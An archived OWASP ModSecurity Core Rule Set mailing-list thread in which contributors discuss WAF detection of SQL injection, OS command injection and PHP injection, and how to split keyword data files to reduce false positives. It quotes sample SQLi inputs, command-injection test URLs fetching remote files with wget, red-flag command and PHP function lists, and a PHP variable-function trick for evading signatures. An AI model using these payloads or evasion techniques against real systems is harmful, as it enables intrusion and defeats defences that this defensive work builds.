            select * from table where id =%input with or without injection%


>From libinjection point of view,  the input of "select a from table b" is unable to join the above statement with correct SQL syntax. But if we just use regex rules, this input is so easy to marked as SQLI. I would like to seek the opinion in this group.  Do you think the request as "http://test.com?id=select a from table b.<http://scanmail.trustwave.com/?c=4062&d=gqW81tQS5NH9eqBDC64SSq9tMwG8F036fnn0Zn-4jg&s=5&u=http%3a%2f%2ftest%2ecom%3fid%3dselect%20a%20from%20table%20b>" would cause really SQL injection successful in SQL syntax in any site?

Thanks
Richard

________________________________

This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.

________________________________

This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20160211/f900ef6d/attachment.html>

From hongpinglin at hotmail.com  Thu Feb 11 17:50:02 2016
From: hongpinglin at hotmail.com (Richard Lin)
Date: Thu, 11 Feb 2016 17:50:02 +0000
Subject: [Owasp-modsecurity-core-rule-set] Need suggestion for a SQLI
 pattern
In-Reply-To: <D2E1F54E.19ECC%csanders@trustwave.com>
References: <20160202080600.GA29931@elias>,
	<44545D09-6265-438E-B743-5564241D5336@spam.lifeforms.nl>,
	<20160207192339.GB30297@elias>,
	<484E224E-34B2-44FB-B694-EFDD93A5B105@spam.lifeforms.nl>,
	<20160210063610.GB8002@elias>,
	<50EAD64C-BE9D-48FC-AC13-B1053B1A2134@noelzindel.org>,
	<20160210082235.GA11645@elias>
	<BAY180-W899BE3E56D16B8C735C9D8BAA80@phx.gbl>,
	<D2E1611F.19E65%csanders@trustwave.com>,
	<BAY180-W91800DDAB02375AD1AE664BAA80@phx.gbl>,
	<D2E1F54E.19ECC%csanders@trustwave.com>
Message-ID: <BAY180-W45127A9174D4CC144B97C9BAA80@phx.gbl>

Thanks Chaim and Christian and I agree that it is bad that a user controls a SQL statement.  I think libinjection covered 'Where' and 'Like' clause as you mentioned.  
I am trying to judge if libinjection missed a category of attacking model in which the user's input is an independent SQLs which can be invoked by themselves (i.e, without prefix of "1 UNION", '1 or", "1 and", etc)  If that is the case, I would consider to propose a patch. But I am not sure how careless developers can directly take the input as SQL itself. That sounds too naive to be believed :)

From: CSanders at trustwave.com
To: hongpinglin at hotmail.com; owasp-modsecurity-core-rule-set at lists.owasp.org
Subject: Re: [Owasp-modsecurity-core-rule-set] Need suggestion for a SQLI pattern
Date: Thu, 11 Feb 2016 13:28:40 +0000






Hey Richard, first I?ll echo what Christian said, but also what you have described is just a LIMITED case of SQL injection. SQL Injection can really deal with any area in which SQL may be introduced by an attacker and it will
 then be executed later. There is no need to limit this to a where clause. For instance it could be in a like clause, it could be the clause itself, it could be the statement (select for instance) etc. The underlying idea is that anywhere a user can control
 a SQL statement would be bad. In fairness to libinjection it isn?t factoring in all these situations it is designed with parameters in mind and SQL injections more a kin to the type you are describing. This is why we leave in complex regex patterns as well
 that can detect SQL patterns like the one you have described.
Another situation where it would be valuable to detect such statements would be in the case of stacked sql queries. Although not all engines support it, in some you may so things like:



select * from User where id =  [ input] to select * from User where id = 1; select a
 from uid2




These are good questions and from these often we?ll discover other facets of the problem or solutions we never thought of so please feel free to keep asking if you have any ideas or questions, or are unclear on something :)









From: Richard Lin <hongpinglin at hotmail.com>

Date: Thursday, February 11, 2016 at 1:06 AM

To: Chaim Sanders <csanders at trustwave.com>, "owasp-modsecurity-core-rule-set at lists.owasp.org" <owasp-modsecurity-core-rule-set at lists.owasp.org>

Subject: RE: [Owasp-modsecurity-core-rule-set] Need suggestion for a SQLI pattern







Thanks. Could you explain in more detail?



My understanding for SQL injection case is  that careless web developers take the web request parameters and add them to their "where clause".



So if the input is  '1 union select a from uid2" that would cause successful injection because the careless developer's SQL was modified from 



select * from User where id =  [ input] to select * from User where id = 1 union select a from
 uid2



In above case, the SQL statement was successfully modified with correct syntax. Thus I can accept this is a successful injection.



But if the input is "select a from uid2", then careless developers
 SQL is as:




select * from User where id = select a from uid2




The above SQL statement is not correct in syntax. So this injection will not be successful. Maybe due to this consideration, the libinjection does not consider input of "select a
 from uid2" is a SQL injection although its SQL pattern is so obvious.



Richard









From: CSanders at trustwave.com

To: hongpinglin at hotmail.com; 
owasp-modsecurity-core-rule-set at lists.owasp.org

Subject: Re: [Owasp-modsecurity-core-rule-set] Need suggestion for a SQLI pattern

Date: Thu, 11 Feb 2016 02:51:44 +0000



Hey Richard,
I?ve seen things CLOSE to this in production. Sites where they?ve attempted to use prepared statements to secure a location where the variable injected in a table name. Of course prepared statements are designed for this environment and will fail miserably.
 But this accounts for a situation where all of the following except the word select is true. Granted it?s unusual. 





From: <owasp-modsecurity-core-rule-set-bounces at lists.owasp.org> on behalf of Richard Lin <hongpinglin at hotmail.com>

Date: Wednesday, February 10, 2016 at 7:31 PM

To: "owasp-modsecurity-core-rule-set at lists.owasp.org" <owasp-modsecurity-core-rule-set at lists.owasp.org>

Subject: [Owasp-modsecurity-core-rule-set] Need suggestion for a SQLI pattern








Hi folks, I just joined the lists one day ago. And would like to seek the opinions of dealing with a SQLI pattern verdict-ed differently between regex rules and libinjection.



http://test.com?id=select a from table b.



I did not make  SQLI "select a from table b" as URL encoded for easier discussion here.



Basically, libinjection does not consider this string as SQLI although its SQLI pattern is so obvious. Libinjection considers the SQL injections are typically in the context of 



         
            select * from table where id =%input with or without injection%






>From libinjection point of view,  the input of "select a from table b" is unable to join the above statement with correct SQL syntax. But if we just use regex rules, this input is so easy to marked as SQLI. I would
 like to seek the opinion in this group.  Do you think the request as "http://test.com?id=select
 a from table b." would cause really SQL injection successful in SQL syntax in any site?



Thanks
Richard








This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information
 contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.











This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information
 contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.

 		 	   		  
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20160211/cddf70ff/attachment-0001.html>

From CSanders at trustwave.com  Thu Feb 11 17:59:59 2016
From: CSanders at trustwave.com (Chaim Sanders)
Date: Thu, 11 Feb 2016 17:59:59 +0000
Subject: [Owasp-modsecurity-core-rule-set] Need suggestion for a SQLI
 pattern
In-Reply-To: <BAY180-W45127A9174D4CC144B97C9BAA80@phx.gbl>
References: <20160202080600.GA29931@elias>
	<44545D09-6265-438E-B743-5564241D5336@spam.lifeforms.nl>
	<20160207192339.GB30297@elias>
	<484E224E-34B2-44FB-B694-EFDD93A5B105@spam.lifeforms.nl>
	<20160210063610.GB8002@elias>
	<50EAD64C-BE9D-48FC-AC13-B1053B1A2134@noelzindel.org>
	<20160210082235.GA11645@elias>
	<BAY180-W899BE3E56D16B8C735C9D8BAA80@phx.gbl>
	<D2E1611F.19E65%csanders@trustwave.com>
	<BAY180-W91800DDAB02375AD1AE664BAA80@phx.gbl>
	<D2E1F54E.19ECC%csanders@trustwave.com>
	<BAY180-W45127A9174D4CC144B97C9BAA80@phx.gbl>
Message-ID: <D2E235CD.19F19%csanders@trustwave.com>

Oh my dear dear friend Richard, never underestimate the inability of developers ? if the language has support for violating good security development considerations ? they will find a way to use that to create a vulnerability. In any event you?d have to look at the mission statement of libinjection ? it is certainly possible and shouldn?t be used alone. It does have a very specific mission, for instance it is not designed to take cookies and separate them or request headers etc. That being said I do like libinjection I think it?s inclusion does add rather than retract from the ModSecurity suite and if you can make it better you are more than encouraged to try. :)

From: Richard Lin <hongpinglin at hotmail.com<mailto:hongpinglin at hotmail.com>>
Date: Thursday, February 11, 2016 at 12:50 PM
To: Chaim Sanders <csanders at trustwave.com<mailto:csanders at trustwave.com>>, "owasp-modsecurity-core-rule-set at lists.owasp.org<mailto:owasp-modsecurity-core-rule-set at lists.owasp.org>" <owasp-modsecurity-core-rule-set at lists.owasp.org<mailto:owasp-modsecurity-core-rule-set at lists.owasp.org>>
Subject: RE: [Owasp-modsecurity-core-rule-set] Need suggestion for a SQLI pattern

Thanks Chaim and Christian and I agree that it is bad that a user controls a SQL statement.  I think libinjection covered 'Where' and 'Like' clause as you mentioned.

I am trying to judge if libinjection missed a category of attacking model in which the user's input is an independent SQLs which can be invoked by themselves (i.e, without prefix of "1 UNION", '1 or", "1 and", etc)  If that is the case, I would consider to propose a patch. But I am not sure how careless developers can directly take the input as SQL itself. That sounds too naive to be believed :)


________________________________
From: CSanders at trustwave.com<mailto:CSanders at trustwave.com>
To: hongpinglin at hotmail.com<mailto:hongpinglin at hotmail.com>; owasp-modsecurity-core-rule-set at lists.owasp.org<mailto:owasp-modsecurity-core-rule-set at lists.owasp.org>
Subject: Re: [Owasp-modsecurity-core-rule-set] Need suggestion for a SQLI pattern
Date: Thu, 11 Feb 2016 13:28:40 +0000

Hey Richard, first I?ll echo what Christian said, but also what you have described is just a LIMITED case of SQL injection. SQL Injection can really deal with any area in which SQL may be introduced by an attacker and it will then be executed later. There is no need to limit this to a where clause. For instance it could be in a like clause, it could be the clause itself, it could be the statement (select for instance) etc. The underlying idea is that anywhere a user can control a SQL statement would be bad. In fairness to libinjection it isn?t factoring in all these situations it is designed with parameters in mind and SQL injections more a kin to the type you are describing. This is why we leave in complex regex patterns as well that can detect SQL patterns like the one you have described.
Another situation where it would be valuable to detect such statements would be in the case of stacked sql queries. Although not all engines support it, in some you may so things like:

select * from User where id =  [ input] to select * from User where id = 1; select a from uid2

These are good questions and from these often we?ll discover other facets of the problem or solutions we never thought of so please feel free to keep asking if you have any ideas or questions, or are unclear on something :)


From: Richard Lin <hongpinglin at hotmail.com<mailto:hongpinglin at hotmail.com>>
Date: Thursday, February 11, 2016 at 1:06 AM
To: Chaim Sanders <csanders at trustwave.com<mailto:csanders at trustwave.com>>, "owasp-modsecurity-core-rule-set at lists.owasp.org<mailto:owasp-modsecurity-core-rule-set at lists.owasp.org>" <owasp-modsecurity-core-rule-set at lists.owasp.org<mailto:owasp-modsecurity-core-rule-set at lists.owasp.org>>
Subject: RE: [Owasp-modsecurity-core-rule-set] Need suggestion for a SQLI pattern

Thanks. Could you explain in more detail?

My understanding for SQL injection case is  that careless web developers take the web request parameters and add them to their "where clause".

So if the input is  '1 union select a from uid2" that would cause successful injection because the careless developer's SQL was modified from

select * from User where id =  [ input] to select * from User where id = 1 union select a from uid2

In above case, the SQL statement was successfully modified with correct syntax. Thus I can accept this is a successful injection.

But if the input is "select a from uid2", then careless developers SQL is as:

select * from User where id = select a from uid2

The above SQL statement is not correct in syntax. So this injection will not be successful. Maybe due to this consideration, the libinjection does not consider input of "select a from uid2" is a SQL injection although its SQL pattern is so obvious.

Richard


________________________________
From: CSanders at trustwave.com<mailto:CSanders at trustwave.com>
To: hongpinglin at hotmail.com<mailto:hongpinglin at hotmail.com>; owasp-modsecurity-core-rule-set at lists.owasp.org<mailto:owasp-modsecurity-core-rule-set at lists.owasp.org>
Subject: Re: [Owasp-modsecurity-core-rule-set] Need suggestion for a SQLI pattern
Date: Thu, 11 Feb 2016 02:51:44 +0000

Hey Richard,
I?ve seen things CLOSE to this in production. Sites where they?ve attempted to use prepared statements to secure a location where the variable injected in a table name. Of course prepared statements are designed for this environment and will fail miserably. But this accounts for a situation where all of the following except the word select is true. Granted it?s unusual.

From: <owasp-modsecurity-core-rule-set-bounces at lists.owasp.org<mailto:owasp-modsecurity-core-rule-set-bounces at lists.owasp.org>> on behalf of Richard Lin <hongpinglin at hotmail.com<mailto:hongpinglin at hotmail.com>>
Date: Wednesday, February 10, 2016 at 7:31 PM
To: "owasp-modsecurity-core-rule-set at lists.owasp.org<mailto:owasp-modsecurity-core-rule-set at lists.owasp.org>" <owasp-modsecurity-core-rule-set at lists.owasp.org<mailto:owasp-modsecurity-core-rule-set at lists.owasp.org>>
Subject: [Owasp-modsecurity-core-rule-set] Need suggestion for a SQLI pattern

Hi folks, I just joined the lists one day ago. And would like to seek the opinions of dealing with a SQLI pattern verdict-ed differently between regex rules and libinjection.

http://test.com?id=select<http://scanmail.trustwave.com/?c=4062&d=9cq81m-50sHLrlIm_iaLgMaFk8OtgRkZLr5vbovmVg&s=5&u=http%3a%2f%2ftest%2ecom%3fid%3dselect> a from table b.

I did not make  SQLI "select a from table b" as URL encoded for easier discussion here.

Basically, libinjection does not consider this string as SQLI although its SQLI pattern is so obvious. Libinjection considers the SQL injections are typically in the context of


            select * from table where id =%input with or without injection%


>From libinjection point of view,  the input of "select a from table b" is unable to join the above statement with correct SQL syntax. But if we just use regex rules, this input is so easy to marked as SQLI. I would like to seek the opinion in this group.  Do you think the request as "http://test.com?id=select a from table b.<http://scanmail.trustwave.com/?c=4062&d=9cq81m-50sHLrlIm_iaLgMaFk8OtgRkZLu1gaYy7Uw&s=5&u=http%3a%2f%2ftest%2ecom%3fid%3dselect%20a%20from%20table%20b>" would cause really SQL injection successful in SQL syntax in any site?

Thanks
Richard

________________________________

This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.

________________________________

This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.

________________________________

This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20160211/b914656d/attachment-0001.html>

From christian.folini at netnea.com  Thu Feb 11 19:41:44 2016
From: christian.folini at netnea.com (Christian Folini)
Date: Thu, 11 Feb 2016 20:41:44 +0100
Subject: [Owasp-modsecurity-core-rule-set] Need suggestion for a SQLI
 pattern
Message-ID: <20160211194144.GA21429@elias>


Richard,

On Thu, Feb 11, 2016 at 05:50:02PM +0000, Richard Lin wrote:
> But I am not sure how careless developers
> can directly take the input as SQL itself. That sounds too naive to be believed :)

A few months ago, I saw an application with a complete sql query in a
cookie named "searchform". Little bobby tables would have been
impressed.

Ahoj,

Christian

-- 
mailto:christian.folini at netnea.com
http://www.christian-folini.ch
twitter: @ChrFolini

From christian.folini at netnea.com  Fri Feb 12 21:14:28 2016
From: christian.folini at netnea.com (Christian Folini)
Date: Fri, 12 Feb 2016 22:14:28 +0100
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial
 candidate 950120 / 931130 (Possible RFI)
In-Reply-To: <20160210063610.GB8002@elias>
References: <20160202080600.GA29931@elias>
	<44545D09-6265-438E-B743-5564241D5336@spam.lifeforms.nl>
	<20160207192339.GB30297@elias>
	<484E224E-34B2-44FB-B694-EFDD93A5B105@spam.lifeforms.nl>
	<20160210063610.GB8002@elias>
Message-ID: <20160212211428.GA32631@elias>

Hi there,

This is just to let you know that I think we settled this discussion
with the resolution to keep it in the set of base rules / on the
default paranoia level.

Walter suggested a set of whitelistings for the rule to avoid
false positives. These should be added, but this will be outside
of the paranoia mode pull request.

Cheers,

Christian



On Wed, Feb 10, 2016 at 07:36:10AM +0100, Christian Folini wrote:
> Hello again,
> 
> On Tue, Feb 09, 2016 at 10:29:54PM +0100, Walter Hop wrote:
> > Well, such a tuning was just one proposal to reduce FP for non-paranoid users so it might tip the balance in favor of keeping the rule in base. (Moving it to paranoid is just one possible way to change the FP / protection balance)
> 
> That makes a lot of sense. I was not aware of this reasoning behind your
> previous message. Thanks for making this clear.
> 
> > I?m not 100% sure we should go very far with whitelistings in the default set. But there is some precedent (excluding Google Analytics cookies, formerly also Piwik I think). The CRS does carve little holes sometimes in order to deal with reality of the current web and still be strict on the rest (while commercial WAFs are necessarily much less strict on this, since it causes them too many support calls).
> 
> Exactly.
> 
> > I would hate to see the rule totally disappear from base just on my one FP note though. Maybe more people can check their audit logs for the rule since it?s in CRSv2 too. It does rule out a lot of exploits on legacy / in house PHP apps and attackers try it daily. So it?s a hard call...
> 
> Let's keep it in the base / on the default paranoia level then. Adding the whitelisting you 
> proposed does little harm and is in line with the UUID whitelisting No?l has developed
> for 981173 (lately moved to 
> https://www.owasp.org/index.php/OWASP_ModSec_CRS_Paranoia_Mode_Sibling_981173)
> 
> Cheers,
> 
> Christian
> 
> -- 
> mailto:christian.folini at netnea.com
> http://www.christian-folini.ch
> twitter: @ChrFolini
> _______________________________________________
> Owasp-modsecurity-core-rule-set mailing list
> Owasp-modsecurity-core-rule-set at lists.owasp.org
> https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set

From christian.folini at netnea.com  Fri Feb 12 21:17:15 2016
From: christian.folini at netnea.com (Christian Folini)
Date: Fri, 12 Feb 2016 22:17:15 +0100
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial
 candidate 950907 / 932100 (System command injection)
In-Reply-To: <20160207195530.GC30297@elias>
References: <20160202081718.GB29931@elias>
	<69CE0D94-2054-443C-8336-033DCCB33934@spam.lifeforms.nl>
	<20160207195530.GC30297@elias>
Message-ID: <20160212211715.GB32631@elias>

Hi there,

There has not been any additional feedback in this thread, but I think
the question is not settled as of this writing.

Thoughts?

Regs,

Christian

On Sun, Feb 07, 2016 at 08:55:30PM +0100, Christian Folini wrote:
> Hi there,
> 
> On Sat, Feb 06, 2016 at 11:04:00PM +0100, Walter Hop wrote:
> > I like the idea of splitting the file.
> 
> Cool.
> 
> > I agree some of the words in os-commands.data seem rather paranoid. Words like "choice", "help", "now? seem of low value and are common in natural text. Also, the large number of Unix-only environments could skip Windows related commands. It?s hard for users to modify these lists as you?d have to hack the CRS, and these huge collections are to maintain anyhow, so I agree we need granularity.
> 
> Good point.
> 
> > The rule has some regexp magic to prevent false positives, but the balance is not a complete success in my opinion. For instance, the following URLs don't trigger in CRSv3:
> > http://vuln/?cmd=wget%20http://example.com/blah.txt
> > http://vuln/?cmd=sh%20blah.txt
> > 
> > So it's not as strong as you would want either to prevent some common RCE.
> > Something like http://vuln/?cmd=Wget%20http://example.com/;%20ecHo does trigger it.
> 
> I see. Good observations.
> 
> > 1) I think that a user should check their desired platforms in the setup conf. In fact, this would be great to do anyway in the initial 3.0.0 release even if we DON'T look at it in any rule yet. Specifying platform types will pave the way for reducing false positives and false negatives by skipping unnecessary checks and being more strict on the right platforms. So we could start by listing these platforms in the existing rule in the setup conf. Example:
> > 
> > 	SecAction \
> > 	  "id:'900024', \
> > 	  phase:1, \
> > 	  t:none, \
> > 	  setvar:tx.unix=1, \
> > 	  setvar:tx.windows=1, \
> > 	  setvar:tx.java=1, \
> > 	  setvar:tx.php=1, \
> 
> That makes a lot of sense. At first sight.
> 
> I think that a default install should come with these rulesets
> all enabled and a sysadmin can then switch them of if we is aware that
> there is no php in his service.
> 
> So given the following two scenarios
> #1 - Newbie sysadmin installs ModSec and runs into a lot of false positives
>     because he does not disable unneeded rulesets
> #2 - Newbie sysadmin installs ModSec and is p0wned because he does not enable
>     the php protection
> I strongly favour #1.
> 
> A vanilla install of the core rules should give you a full coverage for all
> types of services and a decent security level. Reducing false positives by 
> omitting certain rules (ideally rules which provide no value for your setup) 
> is the very idea of tuning.
> Reducing the initial number of false positives by moving certain rules
> with a worse relationsship between added security and false positives,
> that is the idea of the paranoia mode.
> 
> Chaim stated in a different message, that the rules are now organised
> into files aimed at certain environments. So switching them off is
> fairly easy. And there are the tags on top of it.
> So you have tag:'language-PHP' and setting SecRuleRemoveByTag will
> disable them all very easily. 
> 
> So I think, we do not need these variables.
> 
> > (By the way: I think it?s unfortunate that a user has to use value 1 to enable a check. An undefined variable will mean that the CRS will skip some rules. This makes it dangerous to introduce a new variable in the CRS later; all existing installations MUST then add this variable to their setup rule immediately, or suffer from reduced security. It?s better to use a scheme that defaults to ?on?. A convention like ?tx.disable_mysql=1? would be user unfriendly and error-prone. But we could check for an explicit ?off? string, e.g. ?setvar:tx.mysql=off?. If it?s not ?off? then assume that the user DOES want the check. I think it?s important to get this right in 3.0.0, it will be more painful to do it later.)
> 
> That's a very good observation. I had a similar idea once.
> 
> In programming, you usually start with a default value and then
> the users overrides the default value. If he wants to.
> 
> I am not sure how modsecurity_crs_10_setup.conf.example is going to
> be transformed to work seamlessly with 3.0. But this makes the
> setting of default values a bit tricky.
> 
> Maybe a file REQUEST-02-DEFAULTS.conf could set default values
> if certain variables are not set.
> 
> > 2) Separate the words into multiple lists:
> > 	os-commands-critical.data (absolute red flag list: "curl", "passwd", "sh", "uname", "wget" etc.)
> > 	os-commands-paranoid.data (absolute low value, but high FP natural words like "choice")
> > 	os-commands-windows.data (all Windows commands)
> > 	os-commands-common.data (all other commands)
> 
> Makes some sense. Too granular is difficult and you mix various
> grouping criteria (criticality, paranoia, os), which makes is a
> bit hard to follow. 
> 
> Other opinions?
> 
> > 3) Review the current regexp against some test data and CRSv2 to make it more sensitive
> 
> Good plan. Maybe this could be done in a separate pull request.
> I am afraid to overload the paranoia mode pull request... 
> 
> Ahoj,
> 
> Christian
> 
> 
> -- 
> In war you will generally find that the enemy has at any time 
> three courses of action open to him. Of those three, he will 
> invariably choose the fourth.
> -- Helmuth Von Moltke
> _______________________________________________
> Owasp-modsecurity-core-rule-set mailing list
> Owasp-modsecurity-core-rule-set at lists.owasp.org
> https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set

-- 
mailto:christian.folini at netnea.com
http://www.christian-folini.ch
twitter: @ChrFolini

From christian.folini at netnea.com  Fri Feb 12 21:19:22 2016
From: christian.folini at netnea.com (Christian Folini)
Date: Fri, 12 Feb 2016 22:19:22 +0100
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial
 candidate 958977 / 933110 and 958979 / 933120 (PHP Injection Attacks)
In-Reply-To: <20160207201206.GD30297@elias>
References: <20160202082502.GC29931@elias>
	<54703590-4F48-4A1B-9271-E1E29A45FE39@spam.lifeforms.nl>
	<D2DCD071.1752C%csanders@trustwave.com>
	<20160207201206.GD30297@elias>
Message-ID: <20160212211922.GC32631@elias>

And another one.

This conversation is also not settled. Please help us to come
to a conclusion.

The biggest issue is the question of the granularity of the
data files.

Ahoj,

Christian

On Sun, Feb 07, 2016 at 09:12:06PM +0100, Christian Folini wrote:
> Hello,
> 
> Your ideas are extremely valuable Walter. And even if I do not agree 
> with your solutions to the letter, I love the fact that we are having
> technical discussions on the merit of individual rules.
> 
> Chaim seems to be on the same page with me on the idea of
> environment-specific rules and how to handle the enabling / disabling.
> 
> And then the problem of the granularity of the files. There is a
> danger in overengineering things and making the configuration / tuning
> too complex. In that light, I think splitting makes sense, but
> ideally, we end up with 
> 
> xxx-standard.data
> xxx-paranoia.data
> 
> However, you have a point that you can not alter the contents of these 
> data files afterwards in a local setup in a safe way. So disabling Windows 
> commands won't work unless we add specific data files with their own
> rules, which can then be disabled.
> 
> I am really torn here.
> 
> In my stated fear of overloading the paranoia project / pull request,
> I would appreciate to handle the big updates to individual rules
> in separate pull requests - if possible. If it has to be, we include it.
> 
> Ahoj,
> 
> Christian
> 
> 
> On Sun, Feb 07, 2016 at 03:46:32PM +0000, Chaim Sanders wrote:
> > I like the ideas. The first thing I?d note is that individuals are free to
> > exclude or remove entire files so as long as the PHP file is named
> > REQUEST-XYZ-PHP-XYZ people running ASP should get this hint (hopefully)
> > this is why we name them in this way. In terms of splitting the files, I
> > most certainly agree with the ?critical?. Again I caution against
> > splitting data files TOO finely as it will get confusing to support your
> > own instance but this is just a minor issue. As for those parenthesis. You
> > are right and this is actually my fault. I added them to prevent false
> > positives being reported commonly on Cpanel.
> > 
> > On 2/7/16, 8:58 AM,
> > "owasp-modsecurity-core-rule-set-bounces at lists.owasp.org on behalf of
> > Walter Hop" <owasp-modsecurity-core-rule-set-bounces at lists.owasp.org on
> > behalf of modsec at spam.lifeforms.nl> wrote:
> > 
> > >On 02 Feb 2016, at 09:25, Christian Folini <christian.folini at netnea.com>
> > >wrote:
> > >>
> > >> Like the previous post on 950907 / 932100, this is controversial because
> > >> of possible false positives due to a data file with strings:
> > >>
> > >>http://scanmail.trustwave.com/?c=4062&d=7tO31v4ao2_NNeZ84J8wNSWydu00_AAPk
> > >>vSmewhU_w&s=5&u=https%3a%2f%2fraw%2egithubusercontent%2ecom%2fSpiderLabs%
> > >>2fowasp-modsecurity-crs%2fv3%2e0%2e0-rc1%2frules%2fphp-function-names%2ed
> > >>ata
> > >>
> > >>http://scanmail.trustwave.com/?c=4062&d=7tO31v4ao2_NNeZ84J8wNSWydu00_AAPk
> > >>qKjKQ1VqQ&s=5&u=https%3a%2f%2fraw%2egithubusercontent%2ecom%2fSpiderLabs%
> > >>2fowasp-modsecurity-crs%2fv3%2e0%2e0-rc1%2frules%2fphp-config-directives%
> > >>2edata
> > >>
> > >> Could these files be split in the manner explained in the message
> > >> before?
> > >>
> > >> After all, this rule scans input against strings like
> > >> dl, eval, exec, from, precision.
> > >
> > >I would advocate the same separation as in my previous post re
> > >os-commands.
> > >But we need a little more firepower for PHP in my opinion.
> > >A detailed approach could go like this...
> > >
> > >1) Have the user indicate with setvar if they want to protect PHP, and
> > >predicate the rules on that. All the non PHP shops will be solved from FP
> > >instantly!
> > >
> > >2) We need to review the current data file:
> > >- I?m missing some stuff there that I see in the wild every day such as:
> > >gzinflate, gzdecode, gzuncompress, strrev, zlib_decode?
> > >- I also see in some cases the parenthesis is added, like: /file(/ and
> > >/assert(/. This seems easy to evade. In PHP, calling ?assert      ($foo)?
> > >or ?assert\t\t\t($foo)? is just as valid. In this case, it was probably
> > >done because those terms lead to FP. If so, we might move super common
> > >terms with relatively low attacker interest, like assert, to the paranoid
> > >list. But, in any case they should become more robust regexps like
> > >?\bfile\s*(?.
> > >
> > >3) Separate the data file. Start with a small
> > >?php-commands-critical.data? list. This should contain the usual suspects
> > >used for:
> > >- obfuscation: base64_decode, gzdecode, etc...
> > >- execution: passthru, proc_open, shell_exec, call_user_func,
> > >require_once, include_once...
> > >- IO: file_get_contents, file_put_contents, fopen, fwrite...
> > >- environment inspection and setting: error_reporting, function_exists,
> > >ini_set, auto_prepend_file, sys_get_temp_dir...
> > >
> > >If any of those strings is present, it?s certainly an attack, except for
> > >that single person who runs a PHP-related wiki. The list should only
> > >contain the real red flags, don?t try to cleverly prevent FP using
> > >complex regexps, and cannot contain any common English words (so
> > >unfortunately ?require? and ?include? are off limits...)
> > >
> > >4) Other functions could go in ?php-commands-functions.data?. This list
> > >would be small and contain only *proper functions* having PHP syntax
> > >?function()? and have names often used in natural text. To prevent FP we
> > >look for the parenthesis. Let?s take example ?system?, this is often
> > >found in natural text, but an attacker wants to do ?system(? so they need
> > >parentheses and a word boundary at the start. So a regexp might look like
> > >"\bsystem\s*\(?. Because we have the regexp, FP is lowered. It would
> > >still match stuff like ?F*ck the system (yeah yeah)?
> > >
> > >5) Other PHP related terms could stay in ?php-commands-common.data?. This
> > >would list the PHP commands and terms of lesser interest.
> > >
> > >6) We?ll have to review if there are terms which are so common in natural
> > >text that they?ll have to be moved to ?php-commands-paranoid.data?. I
> > >think this list might be as small as possible. Maybe stuff like ?dl?,
> > >?require?, ?include?. It?s still likely to produce FP...
> > >
> > >7) String matching for PHP functions is not powerful enough. We need
> > >generic rules that prevent PHP evasion. I don?t remember seeing this in
> > >the wild, but an easy way to evade textual signature matches would be PHP
> > >variable functions
> > >(http://scanmail.trustwave.com/?c=4062&d=7tO31v4ao2_NNeZ84J8wNSWydu00_AAPk
> > >vCjeQMDpQ&s=5&u=http%3a%2f%2fphp%2enet%2fmanual%2fen%2ffunctions%2evariabl
> > >e-functions%2ephp%29 For instance, you can do the following to get around
> > >the CRS:
> > >
> > >$aB_4c = 'fil' . 'e_get' . '_contents';
> > >$aB_4c('...');
> > >
> > >So we want a generic signature to detect variable function call syntax.
> > >Fortunately its syntax is very uncommon in natural text, so I?d advocate
> > >putting this rule in normal mode.
> > >
> > >Anyway my ?0.02 or maybe a bit more :)
> > >
> > >
> > >_______________________________________________
> > >Owasp-modsecurity-core-rule-set mailing list
> > >Owasp-modsecurity-core-rule-set at lists.owasp.org
> > >http://scanmail.trustwave.com/?c=4062&d=7tO31v4ao2_NNeZ84J8wNSWydu00_AAPkq
> > >emcgoEpA&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%2fow
> > >asp-modsecurity-core-rule-set
> > 
> > 
> > ________________________________
> > 
